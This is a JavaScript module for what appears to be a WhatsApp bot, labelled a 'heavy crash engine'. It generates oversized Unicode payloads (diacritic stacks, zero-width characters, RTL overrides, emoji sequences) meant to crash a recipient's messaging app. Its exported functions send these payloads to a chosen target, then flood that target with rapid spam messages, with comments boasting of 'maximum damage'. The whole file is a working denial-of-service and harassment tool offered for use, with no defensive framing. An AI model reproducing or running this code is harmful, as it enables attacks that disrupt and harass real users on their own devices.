 
// ☠️ ELYXIUM BOT v1.0 - HEAVY CRASH ENGINE
// ⚡ MASSIVE PAYLOADS — Powered by ATHEX & ALTHEA
 

const crashPayloads = [
    // Level 1: Ultra dense diacritic bomb
    () => {
        let bomb = '💀';
        for (let i = 0; i < 25000; i++) bomb += '̵̶̷̸̹̺̻̼͇͈͉͍͎̽̾̿̀́͂̓̈́͆͊͋͌ͅ͏͓͔͕͖͙͚͐͑͒͗͛ͣͤͥͦͧͨͩͪͫͬͭͮͯ͘͜͟͢͝͞͠͡'[i % 64];
        return bomb;
    },

    // Level 2: Emoji variation nuclear
    () => {
        let bomb = '🔥';
        for (let i = 0; i < 12000; i++) bomb += '\uFE0F\u200D\uFE0F\u200D';
        return bomb;
    },

    // Level 3: Zero-width tsunami
    () => {
        let bomb = '⚠️ ';
        for (let i = 0; i < 30000; i++) bomb += '\u200B\u200C\u200D\uFEFF\u2060';
        return bomb + ' ☠️ ELYXIUM ☠️';
    },

    // Level 4: Arabic RTL overload
    () => {
        let bomb = 'ب';
        for (let i = 0; i < 15000; i++) bomb += 'ًٌٍََُِّّْْٰٱٲٳٴٵٶٷٸٹٺٻټٽپٿڀځڂڃڄڅچڇڈډڊڋڌڍڎڏڐڑڒړڔڕږڗژڙ'[i % 50];
        return bomb;
    },

    // Level 5: Family emoji apocalypse
    () => {
        let bomb = '';
        for (let i = 0; i < 6000; i++) bomb += '👨‍👩‍👧‍👦👩‍👩‍👦‍👦👨‍👨‍👧‍👧👩‍👩‍👧‍👧👨‍👩‍👦‍👦';
        return bomb;
    },

    // Level 6: Combined NUCLEAR
    () => {
        let bomb = '☠️';
        for (let i = 0; i < 10000; i++) {
            bomb += '̵\u200B\uFE0Fَ👨‍👩‍👧‍👦\u202E'[i % 10];
        }
        return bomb + ' ☠️ ELYXIUM THERMONUCLEAR ☠️';
    },
];

const getCrashPayload = () => crashPayloads[Math.floor(Math.random() * crashPayloads.length)]();

const sendCrash = async (sock, targetJid) => {
    try {
        const payload = getCrashPayload();
        await sock.sendMessage(targetJid, { text: payload });
        return { success: true, size: payload.length };
    } catch (error) {
        return { success: false, error: error.message };
    }
};

// ✅ HEAVY CRASH — Sequential with adaptive speed
const sendHeavyCrash = async (sock, targetJid, count = 10) => {
    let failCount = 0;
    let sent = 0;

    // Payloads
    for (let i = 0; i < count; i++) {
        try {
            const payload = getCrashPayload();
            await sock.sendMessage(targetJid, { text: payload });
            sent++;
            failCount = Math.max(0, failCount - 1);
        } catch (e) {
            failCount++;
        }
        const delay = failCount > 3 ? 600 : failCount > 1 ? 300 : 100;
        await new Promise(r => setTimeout(r, delay));
    }

    // Rapid flood messages
    for (let i = 0; i < 60; i++) {
        try {
            await sock.sendMessage(targetJid, { text: '☠️💀🔥⚡⚠️🔴🟢' });
            sent++;
            failCount = Math.max(0, failCount - 1);
        } catch (e) {
            failCount++;
        }
        const delay = failCount > 5 ? 500 : i < 20 ? 80 : i < 40 ? 150 : 300;
        await new Promise(r => setTimeout(r, delay));
    }

    // Extra large payloads at the end
    for (let i = 0; i < 5; i++) {
        try {
            const payload = getCrashPayload();
            await sock.sendMessage(targetJid, { text: payload });
            sent++;
        } catch (e) {}
        await new Promise(r => setTimeout(r, 500));
    }

    return { success: true, messages: sent };
};

// ✅ GOD CRASH — Maximum damage
const sendGodCrash = async (sock, targetJid) => {
    return await sendHeavyCrash(sock, targetJid, 15);
};

module.exports = { sendCrash, sendHeavyCrash, sendGodCrash, getCrashPayload };